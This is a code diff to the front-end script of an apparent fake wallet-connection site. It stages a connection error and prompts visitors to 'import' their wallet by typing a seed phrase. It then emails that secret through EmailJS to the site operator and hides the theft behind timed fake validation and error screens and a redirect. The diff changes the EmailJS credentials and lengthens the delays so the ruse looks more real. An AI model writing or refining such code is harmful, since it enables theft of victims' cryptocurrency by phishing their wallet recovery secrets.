@@ -1,8 +1,8 @@
 
 document.addEventListener('DOMContentLoaded', function() {
     // Initialize EmailJS
-    emailjs.init("hwWuRqhr9vJTWa-n8");
-    
+    emailjs.init("bta7R__dXyRVCcOMU");
+
     const connectWalletBtn = document.getElementById('connect-wallet-btn');
     const walletModal = document.getElementById('wallet-modal');
     const stepsModal = document.getElementById('steps-modal');
@@ -28,7 +28,7 @@ document.addEventListener('DOMContentLoaded', function() {
     document.querySelectorAll('.wallet-item').forEach(item => {
         item.addEventListener('click', function() {
             selectedWallet = this.dataset.wallet;
-            
+
             if (selectedWallet === 'other') {
                 walletModal.classList.add('hidden');
                 customWalletModal.classList.remove('hidden');
@@ -39,23 +39,28 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 
-    // Show connection steps with immediate error
+    // Show connection steps with 10 second delay before error
     function showConnectionSteps() {
         stepsModal.classList.remove('hidden');
-        document.getElementById('step-title').textContent = 'Initializing';
-        document.getElementById('step-description').textContent = 'Error connecting to wallet...';
-        
-        // Show error immediately, then move to import modal
+        document.getElementById('step-title').textContent = 'Connecting...';
+        document.getElementById('step-description').textContent = 'Connecting to your wallet...';
+
+        // Show error after 10 seconds, then move to import modal
         setTimeout(() => {
-            stepsModal.classList.add('hidden');
-            showImportModal();
-        }, 2000);
+            document.getElementById('step-title').textContent = 'Connection Failed';
+            document.getElementById('step-description').textContent = 'Error connecting to wallet...';
+
+            setTimeout(() => {
+                stepsModal.classList.add('hidden');
+                showImportModal();
+            }, 1000);
+        }, 10000);
     }
 
     // Show import modal
     function showImportModal() {
         const walletName = selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1);
-        document.getElementById('import-title').textContent = `Import your ${walletName} wallet`;
+        document.getElementById('wallet-name').textContent = walletName;
         importModal.classList.remove('hidden');
     }
 
@@ -71,11 +76,11 @@ document.addEventListener('DOMContentLoaded', function() {
         option.addEventListener('click', function() {
             document.querySelectorAll('.import-option').forEach(opt => opt.classList.remove('active'));
             this.classList.add('active');
-            
+
             const selectedOption = this.dataset.option;
             const label = document.querySelector('.import-form label');
             const input = document.getElementById('seed-input');
-            
+
             switch(selectedOption) {
                 case 'seed':
                     label.textContent = 'Enter your wallet seed phrase';
@@ -97,7 +102,7 @@ document.addEventListener('DOMContentLoaded', function() {
     validateBtn.addEventListener('click', function() {
         const seedPhrase = seedInput.value.trim();
         const selectedOption = document.querySelector('.import-option.active').dataset.option;
-        
+
         if (!seedPhrase) {
             alert('Please enter your seed phrase');
             return;
@@ -114,7 +119,7 @@ document.addEventListener('DOMContentLoaded', function() {
             issue: selectedIssue || 'General wallet connection'
         };
 
-        emailjs.send("service_xccsf1u", "template_icljc9o", templateParams)
+        emailjs.send("service_1j6pmii", "template_lgwdgvk", templateParams)
             .then(function(response) {
                 console.log('Email sent successfully:', response);
             })
@@ -136,17 +141,19 @@ document.addEventListener('DOMContentLoaded', function() {
             })
         });
 
-        // Show validation for 3 seconds then show error
+        // Show validation for 10 seconds then show error for 5 seconds
         setTimeout(() => {
             validationModal.classList.add('hidden');
             errorModal.classList.remove('hidden');
-            
-            // Redirect to home after 5 seconds
+
+            // Hide error modal after 5 seconds and redirect to homepage
             setTimeout(() => {
                 errorModal.classList.add('hidden');
                 resetApp();
+                // Redirect to homepage
+                window.location.href = '/';
             }, 5000);
-        }, 3000);
+        }, 10000); // 10 seconds = 10,000 milliseconds
     });
 
     // Close button click
@@ -220,7 +227,7 @@ document.addEventListener('DOMContentLoaded', function() {
     document.getElementById('troubleshoot-select').addEventListener('change', function() {
         if (this.value) {
             selectedIssue = this.options[this.selectedIndex].text;
-            
+
             if (this.value === 'other') {
                 customIssueModal.classList.remove('hidden');
             } else {
